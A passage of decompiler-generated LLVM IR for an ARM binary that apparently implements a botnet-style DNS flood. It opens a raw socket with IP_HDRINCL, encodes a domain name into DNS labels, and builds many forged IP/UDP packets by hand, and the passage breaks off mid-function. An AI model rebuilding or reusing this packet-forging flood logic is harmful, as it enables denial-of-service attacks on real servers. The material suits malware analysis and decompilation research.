  br i1 %v9_a688, label %dec_label_pc_a6d0, label %dec_label_pc_a690

dec_label_pc_a690:                                ; preds = %dec_label_pc_a6b4, %dec_label_pc_a688, %bb
  %v0_a6c029 = phi i32 [ %v0_a6c0, %dec_label_pc_a6b4 ], [ %v0_a6c030, %dec_label_pc_a688 ], [ %v0_a6c0, %bb ]
  %v0_a6a025 = phi i32 [ 0, %dec_label_pc_a6b4 ], [ %v0_a6a026, %dec_label_pc_a688 ], [ 0, %bb ]
  %v1_a690 = add i32 %v0_a690, 1
  store i32 %v1_a690, i32* @r4, align 4
  %v9_a694 = icmp eq i32 %v1_a690, %v0_a670
  store i1 %v9_a694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a694, label %dec_label_pc_ab04, label %dec_label_pc_a69c

dec_label_pc_a69c:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a678
  %v0_a690 = phi i32 [ %v1_a690, %dec_label_pc_a690 ], [ %v0_a668, %dec_label_pc_a678 ]
  %v0_a6c0 = phi i32 [ %v0_a6c029, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a0 = phi i32 [ %v0_a6a025, %dec_label_pc_a690 ], [ 0, %dec_label_pc_a678 ]
  %v0_a6a8 = phi i32 [ %v1_a6a8, %dec_label_pc_a690 ], [ %v2_a678, %dec_label_pc_a678 ]
  %v1_a69c = inttoptr i32 %v0_a6a8 to i8*
  %v2_a69c = load i8, i8* %v1_a69c, align 1
  %v3_a69c = zext i8 %v2_a69c to i32
  store i32 %v3_a69c, i32* %r3.global-to-local, align 4
  %v2_a6a0 = icmp eq i32 %v0_a6a0, 0
  store i1 %v2_a6a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a6a4, i32* %r0.global-to-local, align 4
  %v1_a6a8 = add i32 %v0_a6a8, 1
  store i32 %v1_a6a8, i32* %r2.global-to-local, align 4
  %v1_a6ac = add nsw i32 %v3_a69c, -48
  store i32 %v1_a6ac, i32* %r1.global-to-local, align 4
  br i1 %v2_a6a0, label %dec_label_pc_a6b4, label %dec_label_pc_a6c4

dec_label_pc_a6b4:                                ; preds = %dec_label_pc_a69c
  %v7_a6b4 = icmp eq i8 %v2_a69c, 9
  store i1 %v7_a6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6b4, label %dec_label_pc_a690, label %bb

bb:                                               ; preds = %dec_label_pc_a6b4
  %v8_a6b8 = icmp eq i8 %v2_a69c, 32
  store i1 %v8_a6b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_a6b8, label %dec_label_pc_a690, label %dec_label_pc_a6c0

dec_label_pc_a6c0:                                ; preds = %bb
  %v1_a6c0 = add i32 %v0_a6c0, 1
  store i32 %v1_a6c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a6c4

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a69c, %dec_label_pc_a6c0
  %v0_a6c030 = phi i32 [ %v0_a6c0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v0_a6a026 = phi i32 [ %v0_a6a0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v7_a6c4 = icmp eq i8 %v2_a69c, 46
  store i1 %v7_a6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6c4, label %dec_label_pc_a688, label %bb103

bb103:                                            ; preds = %dec_label_pc_a6c4
  %v8_a6c8 = icmp eq i32 %v1_a6ac, 9
  store i1 %v8_a6c8, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_a6ac, 10
  br i1 %tmp, label %dec_label_pc_a688, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a688, %bb103
  %v0_a690.lcssa = phi i32 [ %v1_a6a4, %dec_label_pc_a688 ], [ %v0_a690, %bb103 ]
  %v2_a6d4 = sub i32 %v0_a690.lcssa, %v0_a668
  store i32 %v2_a6d4, i32* @r4, align 4
  %v2_a6d8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_a678, i32* %r1.global-to-local, align 4
  store i32 %v2_a6d8, i32* %r0.global-to-local, align 4
  store i32 %v2_a6d4, i32* %r2.global-to-local, align 4
  %v3_a6e8 = call i32 @util_memcpy(i32 %v2_a6d8, i32 %v2_a678, i32 %v2_a6d4)
  %v2_a6ec = ptrtoint i32* %stack_var_-40 to i32
  %v1_a6f0 = load i32, i32* @r4, align 4
  %v2_a6f0 = add i32 %v1_a6f0, %v2_a6ec
  store i32 %v2_a6f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a6d8, i32* @r0, align 4
  %v3_a6fc = add i32 %v2_a6f0, -36
  %v4_a6fc = inttoptr i32 %v3_a6fc to i8*
  store i8 0, i8* %v4_a6fc, align 1
  %v1_a700 = call i32 @inet_addr(i32 %v2_a6d8)
  store i32 %v1_a700, i32* %r0.global-to-local, align 4
  store i32 %v1_a700, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_a70811:                              ; preds = %dec_label_pc_ab04
  unreachable

dec_label_pc_a708:                                ; preds = %dec_label_pc_ab6c, %dec_label_pc_ab60, %dec_label_pc_ab50, %dec_label_pc_ab40, %dec_label_pc_a6d0
  %v1_ab3c49 = phi i32 [ %v1_ab08, %dec_label_pc_ab6c ], [ %v1_ab08, %dec_label_pc_ab60 ], [ %v1_ab08, %dec_label_pc_ab50 ], [ %v1_ab08, %dec_label_pc_ab40 ], [ %v1_a700, %dec_label_pc_a6d0 ]
  %v0_a708 = load i32, i32* @r7, align 4
  %v2_a708 = icmp eq i32 %v0_a708, 0
  store i1 %v2_a708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a708, label %dec_label_pc_ab30, label %dec_label_pc_a710

dec_label_pc_a710:                                ; preds = %dec_label_pc_a708
  store i32 %v0_a708, i32* %r0.global-to-local, align 4
  %v1_a714 = inttoptr i32 %v0_a708 to i8*
  %v2_a714 = call i32 @util_strlen(i8* %v1_a714)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_a714, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a728 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v7_a72c = icmp eq i32 %v3_a728, -1
  store i1 %v7_a72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a72c, label %dec_label_pc_ab30, label %dec_label_pc_a738

dec_label_pc_a738:                                ; preds = %dec_label_pc_a710
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a740 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a740, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a754 = call i32 @__GI_setsockopt(i32 %v3_a728, i32 0, i32 3, i32 %v6_a740, i32 4)
  store i32 %v5_a754, i32* %r0.global-to-local, align 4
  %v7_a758 = icmp eq i32 %v5_a754, -1
  store i1 %v7_a758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a758, label %dec_label_pc_ab28, label %dec_label_pc_a760

dec_label_pc_a760:                                ; preds = %dec_label_pc_a738
  %v0_a768 = load i32, i32* @sb, align 4
  %v1_a768 = urem i32 %v0_a768, 256
  %v3_a770 = mul i32 %v6_a578, 65536
  store i32 %v3_a770, i32* %r3.global-to-local, align 4
  %v5_a77c = trunc i32 %v0_a768 to i8
  %v0_a780 = load i32, i32* @r8, align 4
  %v2_a780 = icmp eq i32 %v0_a780, 0
  store i1 %v2_a780, i1* %cpsr_z.global-to-local, align 1
  %v3_a784 = urem i32 %v7_a51c, 65536
  store i32 %v3_a784, i32* %r0.global-to-local, align 4
  %v3_a78c = urem i32 %v6_a578, 65536
  store i32 %v3_a78c, i32* %r2.global-to-local, align 4
  %v3_a790 = mul i32 %v6_a590, 65536
  %v3_a794 = mul i32 %v6_a5ac, 65536
  store i32 %v3_a794, i32* %ip.global-to-local, align 4
  br i1 %v2_a780, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_a760
  %v5_a79c = sext i8 %v5_a77c to i32
  store i32 %v5_a79c, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_a760, %bb104
  %v2_a7c8 = phi i32 [ %v3_a78c, %dec_label_pc_a760 ], [ %v5_a79c, %bb104 ]
  %v3_a7a8 = urem i32 %v6_a590, 65536
  store i32 %v3_a7a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_a7b0 = urem i32 %v6_a5ac, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_a7c8 = load i32, i32* @r6, align 4
  br i1 %v2_a780, label %.dec_label_pc_a9b0.preheader_crit_edge, label %dec_label_pc_a7d0

.dec_label_pc_a9b0.preheader_crit_edge:           ; preds = %bb105
  %v3_a7c8 = add i32 %v1_a7c8, %v2_a7c8
  store i32 %v3_a7c8, i32* @r7, align 4
  %.pre = sext i8 %v5_a77c to i32
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a7d0:                                ; preds = %bb105
  %v2_a7d0 = add i32 %v1_a7c8, %v1_a768
  %v3_a7d4 = mul i32 %v2_a7d0, 65536
  %v1_a7dc = add i32 %v3_a7d4, 1769472
  %v1_a7e0 = add i32 %v3_a7d4, 3080192
  %tmp106 = udiv i32 %v1_a7e0, 256
  %v3_a7f4 = and i32 %tmp106, 65280
  %v4_a804 = udiv i32 %v1_a7e0, 16777216
  %v5_a804 = or i32 %v3_a7f4, %v4_a804
  store i32 %v5_a804, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_a578 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_a51c, 256
  %v3_a818 = and i32 %tmp107, 65280
  store i32 %v3_a818, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_a51c, 256
  %v4_a81c = urem i32 %tmp108, 256
  %v5_a81c = or i32 %v4_a81c, %v3_a818
  store i32 %v5_a81c, i32* @sb, align 4
  store i32 %v3_a794, i32* %r2.global-to-local, align 4
  store i32 %v3_a790, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_a590, 256
  %v3_a830 = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_a5ac, 256
  %v3_a834 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_a7dc, 256
  %v3_a838 = and i32 %tmp111, 65280
  store i32 %v3_a838, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_a590, 256
  %v4_a83c = urem i32 %tmp112, 256
  %v5_a83c = or i32 %v4_a83c, %v3_a830
  store i32 %v5_a83c, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_a5ac, 256
  %v4_a840 = urem i32 %tmp113, 256
  %v5_a840 = or i32 %v4_a840, %v3_a834
  store i32 %v5_a840, i32* @r4, align 4
  %v1_a844 = add i32 %v1_a7c8, 1
  store i32 %v1_a844, i32* %r3.global-to-local, align 4
  %v4_a848 = udiv i32 %v1_a7dc, 16777216
  %v5_a848 = or i32 %v4_a848, %tmp111
  store i32 0, i32* @r5, align 4
  %sext = mul i32 %v6_a4f8, 16777216
  %v4_a8a0 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v6_a534, 16777216
  %v4_a8ac = sdiv i32 %sext8, 16777216
  %v4_a8cc = sext i8 %v5_a77c to i32
  %sext9 = mul nuw i32 %v5_a83c, 65536
  %v7_a8e0 = sdiv i32 %sext9, 65536
  %sext10 = mul nuw i32 %v5_a840, 65536
  %v4_a908 = sdiv i32 %sext10, 65536
  %v1_a8a8 = trunc i32 %v4_a8a0 to i8
  %extract.t = trunc i32 %v4_a8ac to i8
  %v1_a8d0 = add nsw i32 %v4_a8cc, 41
  %sext120 = mul i32 %v5_a848, 65536
  %v3_a8e0 = sdiv i32 %sext120, 65536
  br label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a980, %dec_label_pc_a7d0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_a868 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_a868, i32* %r0.global-to-local, align 4
  store i32 %v2_a4e0, i32* %ip.global-to-local, align 4
  %v3_a870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  %v2_a874 = load i32, i32* @r5, align 4
  %v5_a874 = mul i32 %v2_a874, 4
  %v6_a874 = add i32 %v5_a874, %v2_a4e0
  %v7_a874 = inttoptr i32 %v6_a874 to i32*
  store i32 %v2_a868, i32* %v7_a874, align 4
  %v0_a878 = load i32, i32* %ip.global-to-local, align 4
  %v1_a878 = load i32, i32* %r3.global-to-local, align 4
  %v4_a878 = mul i32 %v1_a878, 4
  %v5_a878 = add i32 %v4_a878, %v0_a878
  %v6_a878 = inttoptr i32 %v5_a878 to i32*
  %v7_a878 = load i32, i32* %v6_a878, align 4
  store i32 %v7_a878, i32* %r1.global-to-local, align 4
  %v1_a87c = inttoptr i32 %v7_a878 to i8*
  %v2_a87c = load i8, i8* %v1_a87c, align 1
  %tmp127 = urem i8 %v2_a87c, 16
  %v1_a880 = zext i8 %tmp127 to i32
  %v1_a884 = or i32 %v1_a880, 64
  store i32 %v1_a884, i32* %r2.global-to-local, align 4
  %v1_a888 = trunc i32 %v1_a884 to i8
  store i8 %v1_a888, i8* %v1_a87c, align 1
  %v0_a88c = load i32, i32* %r1.global-to-local, align 4
  %v1_a88c = inttoptr i32 %v0_a88c to i8*
  %v2_a88c = load i8, i8* %v1_a88c, align 1
  %v3_a88c = zext i8 %v2_a88c to i32
  %v1_a890 = and i32 %v3_a88c, 240
  %v1_a894 = or i32 %v1_a890, 5
  store i32 %v1_a894, i32* %r3.global-to-local, align 4
  store i32 %v1_a560, i32* %lr.global-to-local, align 4
  %v1_a89c = trunc i32 %v1_a894 to i8
  store i8 %v1_a89c, i8* %v1_a88c, align 1
  store i32 %v4_a8a0, i32* %r0.global-to-local, align 4
  %v0_a8a4 = load i32, i32* %lr.global-to-local, align 4
  %v2_a8a4 = icmp eq i32 %v0_a8a4, 0
  store i1 %v2_a8a4, i1* %cpsr_z.global-to-local, align 1
  %v2_a8a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8a8 = add i32 %v2_a8a8, 1
  %v4_a8a8 = inttoptr i32 %v3_a8a8 to i8*
  store i8 %v1_a8a8, i8* %v4_a8a8, align 1
  store i32 %v4_a8ac, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a8b0, label %.thread13, label %bb114

bb114:                                            ; preds = %dec_label_pc_a860
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a8b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_a8b4 = add i32 %v3_a8b4, 6
  %v5_a8b4 = inttoptr i32 %v4_a8b4 to i16*
  store i16 64, i16* %v5_a8b4, align 2
  %v0_a8bc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_a8bc.pre to i8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_a860, %bb114
  %v0_a8bc.off0 = phi i8 [ %extract.t, %dec_label_pc_a860 ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_a8bc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8bc = add i32 %v2_a8bc, 8
  %v4_a8bc = inttoptr i32 %v3_a8bc to i8*
  store i8 %v0_a8bc.off0, i8* %v4_a8bc, align 1
  %v0_a8c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8c0 = trunc i32 %v0_a8c0 to i8
  %v2_a8c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8c0 = add i32 %v2_a8c0, 9
  %v4_a8c0 = inttoptr i32 %v3_a8c0 to i8*
  store i8 %v1_a8c0, i8* %v4_a8c0, align 1
  %v2_a8c8 = load i32, i32* @global_var_25d48.57, align 4
  %v0_a8d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a8d4 = add i32 %v1_a8d0, %v0_a8d0
  store i32 %v2_a8d4, i32* @r4, align 4
  %v2_a8d8 = add i32 %v0_a8d0, 12
  %v3_a8d8 = inttoptr i32 %v2_a8d8 to i32*
  store i32 %v2_a8c8, i32* %v3_a8d8, align 4
  store i32 %v3_a8e0, i32* %r2.global-to-local, align 4
  store i32 %v7_a8e0, i32* %r3.global-to-local, align 4
  %v0_a8e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8e4 = add i32 %v0_a8e4, 20
  store i32 %v1_a8e4, i32* %ip.global-to-local, align 4
  %v0_a8e8 = load i32, i32* @sl, align 4
  %v1_a8e8 = trunc i32 %v0_a8e8 to i16
  %v3_a8e8 = add i32 %v0_a8e4, 2
  %v4_a8e8 = inttoptr i32 %v3_a8e8 to i16*
  store i16 %v1_a8e8, i16* %v4_a8e8, align 2
  %v0_a8ec = load i32, i32* @sb, align 4
  %v1_a8ec = trunc i32 %v0_a8ec to i16
  %v2_a8ec = load i32, i32* %r1.global-to-local, align 4
  %v3_a8ec = add i32 %v2_a8ec, 4
  %v4_a8ec = inttoptr i32 %v3_a8ec to i16*
  store i16 %v1_a8ec, i16* %v4_a8ec, align 2
  %v0_a8f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a8f0 = trunc i32 %v0_a8f0 to i16
  %v2_a8f0 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f0 = add i32 %v2_a8f0, 4
  %v4_a8f0 = inttoptr i32 %v3_a8f0 to i16*
  store i16 %v1_a8f0, i16* %v4_a8f0, align 2
  %v0_a8f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8f4 = trunc i32 %v0_a8f4 to i16
  %v2_a8f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f4 = add i32 %v2_a8f4, 2
  %v4_a8f4 = inttoptr i32 %v3_a8f4 to i16*
  store i16 %v1_a8f4, i16* %v4_a8f4, align 2
  %v2_a8fc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8fc = add i32 %v2_a8fc, 20
  %v4_a8fc = inttoptr i32 %v3_a8fc to i16*
  store i16 %rev, i16* %v4_a8fc, align 2
  store i32 %v4_a8cc, i32* %ip.global-to-local, align 4
  %v0_a904 = load i32, i32* %r1.global-to-local, align 4
  %v1_a904 = add i32 %v0_a904, 28
  store i32 %v1_a904, i32* %r0.global-to-local, align 4
  store i32 %v4_a908, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_a914 = add i32 %v0_a904, 30
  %v4_a914 = inttoptr i32 %v3_a914 to i16*
  store i16 1, i16* %v4_a914, align 2
  %v0_a918 = load i32, i32* @lr, align 4
  %v1_a918 = trunc i32 %v0_a918 to i16
  %v2_a918 = load i32, i32* %r0.global-to-local, align 4
  %v3_a918 = add i32 %v2_a918, 4
  %v4_a918 = inttoptr i32 %v3_a918 to i16*
  store i16 %v1_a918, i16* %v4_a918, align 2
  %v0_a91c = load i32, i32* %ip.global-to-local, align 4
  %v1_a91c = trunc i32 %v0_a91c to i8
  %v2_a91c = load i32, i32* %r1.global-to-local, align 4
  %v3_a91c = add i32 %v2_a91c, 40
  %v4_a91c = inttoptr i32 %v3_a91c to i8*
  store i8 %v1_a91c, i8* %v4_a91c, align 1
  %v0_a920 = load i32, i32* @fp, align 4
  %v1_a920 = load i32, i32* %r1.global-to-local, align 4
  %v2_a920 = add i32 %v1_a920, 16
  %v3_a920 = inttoptr i32 %v2_a920 to i32*
  store i32 %v0_a920, i32* %v3_a920, align 4
  %v0_a924 = load i32, i32* %r3.global-to-local, align 4
  %v1_a924 = trunc i32 %v0_a924 to i16
  %v2_a924 = load i32, i32* %r1.global-to-local, align 4
  %v3_a924 = add i32 %v2_a924, 28
  %v4_a924 = inttoptr i32 %v3_a924 to i16*
  store i16 %v1_a924, i16* %v4_a924, align 2
  %v0_a928 = load i32, i32* @r4, align 4
  %v1_a928 = add i32 %v0_a928, 1
  store i32 %v1_a928, i32* %r0.global-to-local, align 4
  %v0_a92c = load i32, i32* @r7, align 4
  store i32 %v0_a92c, i32* %r1.global-to-local, align 4
  store i32 %v1_a844, i32* %r2.global-to-local, align 4
  %v3_a934 = call i32 @util_memcpy(i32 %v1_a928, i32 %v0_a92c, i32 %v1_a844)
  store i32 %v3_a934, i32* %r0.global-to-local, align 4
  %v0_a938 = load i32, i32* @r6, align 4
  %v2_a938 = icmp eq i32 %v0_a938, 0
  store i1 %v2_a938, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_a938, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_a948

bb116:                                            ; preds = %.thread13
  %v5_a93c = load i32, i32* @r4, align 4
  store i32 %v5_a93c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a980

dec_label_pc_a948:                                ; preds = %.thread13
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a954

dec_label_pc_a954:                                ; preds = %.thread20, %dec_label_pc_a948
  %v0_a960 = phi i32 [ %storemerge, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v0_a964 = phi i32 [ %v0_a978, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v1_a954 = load i32, i32* @r7, align 4
  %v2_a954 = add i32 %v1_a954, %v0_a964
  %v3_a954 = inttoptr i32 %v2_a954 to i8*
  %v4_a954 = load i8, i8* %v3_a954, align 1
  %v6_a954 = zext i8 %v4_a954 to i32
  store i32 %v6_a954, i32* %r3.global-to-local, align 4
  %v7_a958 = icmp eq i8 %v4_a954, 46
  store i1 %v7_a958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a958, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_a954
  %v1_a96016 = add nsw i32 %v0_a960, 1
  store i32 %v1_a96016, i32* %r2.global-to-local, align 4
  %v1_a96418 = add i32 %v0_a964, 1
  store i32 %v1_a96418, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_a954
  %v2_a95c = load i32, i32* @r4, align 4
  %v3_a95c = add i32 %v2_a95c, %v0_a964
  store i32 %v3_a95c, i32* %r3.global-to-local, align 4
  %v1_a960 = add nsw i32 %v0_a960, 1
  store i32 %v1_a960, i32* %r2.global-to-local, align 4
  %v1_a964 = add i32 %v0_a964, 1
  store i32 %v1_a964, i32* %r1.global-to-local, align 4
  %v2_a968 = trunc i32 %v0_a960 to i8
  %v3_a968 = load i32, i32* %r0.global-to-local, align 4
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 %v2_a968, i8* %v4_a968, align 1
  %v0_a96c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a96c.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_a96c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_a96c = phi i32 [ %v1_a96c.pre, %bb117.bb118_crit_edge ], [ %v1_a96016, %.thread59 ]
  %v2_a96c = urem i32 %v1_a96c, 256
  br label %.thread20

bb119:                                            ; preds = %bb117
  %v1_a970 = load i32, i32* %r3.global-to-local, align 4
  %v2_a970 = add i32 %v1_a970, 1
  store i32 %v2_a970, i32* %r0.global-to-local, align 4
  br label %.thread20

.thread20:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_a96c, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_a978 = load i32, i32* %r1.global-to-local, align 4
  %v1_a978 = load i32, i32* @r6, align 4
  %v9_a978 = icmp eq i32 %v0_a978, %v1_a978
  store i1 %v9_a978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a978, label %dec_label_pc_a980.loopexit, label %dec_label_pc_a954

dec_label_pc_a980.loopexit:                       ; preds = %.thread20
  %v2_a980.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_a980

dec_label_pc_a980:                                ; preds = %bb116, %dec_label_pc_a980.loopexit
  %v0_a980.off0 = phi i8 [ %extract.t126, %dec_label_pc_a980.loopexit ], [ 0, %bb116 ]
  %v2_a980 = phi i32 [ %v2_a980.pre, %dec_label_pc_a980.loopexit ], [ %v5_a93c, %bb116 ]
  %v3_a980 = inttoptr i32 %v2_a980 to i8*
  store i8 %v0_a980.off0, i8* %v3_a980, align 1
  %v3_a984 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a984, i32* %r3.global-to-local, align 4
  %v1_a988 = add i32 %v3_a984, 1
  store i32 %v1_a988, i32* @r5, align 4
  %v0_a98c = load i32, i32* @r4, align 4
  %v1_a98c = load i32, i32* @r6, align 4
  %v2_a98c = add i32 %v1_a98c, %v0_a98c
  store i32 %v2_a98c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_a994 = load i32, i32* @r8, align 4
  %v9_a994 = icmp eq i32 %v0_a994, %v1_a988
  store i1 %v9_a994, i1* %cpsr_z.global-to-local, align 1
  %v3_a998 = add i32 %v2_a98c, 4
  %v4_a998 = inttoptr i32 %v3_a998 to i16*
  store i16 256, i16* %v4_a998, align 2
  %v0_a99c = load i32, i32* @lr, align 4
  %v1_a99c = trunc i32 %v0_a99c to i16
  %v2_a99c = load i32, i32* %r2.global-to-local, align 4
  %v3_a99c = add i32 %v2_a99c, 2
  %v4_a99c = inttoptr i32 %v3_a99c to i16*
  store i16 %v1_a99c, i16* %v4_a99c, align 2
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %stack_var_-44, align 4
  %v8_a9a4 = icmp sgt i32 %v0_a994, %v1_a988
  br i1 %v8_a9a4, label %dec_label_pc_a860, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %dec_label_pc_a980
  store i32 %v4_a8cc, i32* %r0.global-to-local, align 4
  %v0_a9ac = load i32, i32* @r6, align 4
  %v2_a9ac = add i32 %v0_a9ac, %v4_a8cc
  store i32 %v2_a9ac, i32* @r7, align 4
  %v0_a9b4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a9b0.preheader:                      ; preds = %.dec_label_pc_a9b0.preheader_crit_edge, %dec_label_pc_a9a8
  %v4_aa14.pre-phi = phi i32 [ %.pre, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v4_a8cc, %dec_label_pc_a9a8 ]
  %v0_a9b4.pre = phi i32 [ 0, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v0_a9b4.pre.pre, %dec_label_pc_a9a8 ]
  %v3_a9e0 = icmp eq i32 %v3_a784, 65535
  %v3_a9f0 = icmp eq i32 %v3_a78c, 65535
  br label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8, %dec_label_pc_a9b0.preheader
  %v0_a9b4 = phi i32 [ %v0_a9b4.pre, %dec_label_pc_a9b0.preheader ], [ 0, %dec_label_pc_aaa8 ], [ 0, %dec_label_pc_a9b0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9b4 = icmp eq i32 %v0_a9b4, 0
  store i1 %v2_a9b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a9b4, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_a9c4 = load i32, i32* @r7, align 4
  %v1_a9c4 = add i32 %v0_a9c4, 27
  store i32 %v1_a9c4, i32* @sb, align 4
  %v1_a9c8 = add i32 %v0_a9c4, 47
  store i32 %v1_a9c8, i32* @sl, align 4
  br label %dec_label_pc_a9cc

dec_label_pc_a9cc:                                ; preds = %dec_label_pc_aa10, %dec_label_pc_a9c0
  %v1_a9d8 = phi i32 [ %v1_aa98, %dec_label_pc_aa10 ], [ 0, %dec_label_pc_a9c0 ]
  store i32 %v2_a4e0, i32* %r3.global-to-local, align 4
  store i32 %v3_a784, i32* %ip.global-to-local, align 4
  %v4_a9d8 = mul i32 %v1_a9d8, 4
  %v5_a9d8 = add i32 %v4_a9d8, %v2_a4e0
  %v6_a9d8 = inttoptr i32 %v5_a9d8 to i32*
  %v7_a9d8 = load i32, i32* %v6_a9d8, align 4
  store i32 %v7_a9d8, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_a9e0, i1* %cpsr_z.global-to-local, align 1
  %v1_a9e4 = add i32 %v7_a9d8, 20
  store i32 %v1_a9e4, i32* @r6, align 4
  br i1 %v3_a9e0, label %dec_label_pc_aabc, label %dec_label_pc_a9ec

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9cc
  store i32 %v3_a78c, i32* @lr, align 4
  store i1 %v3_a9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a9f0, label %dec_label_pc_aad0, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge, %dec_label_pc_a9ec
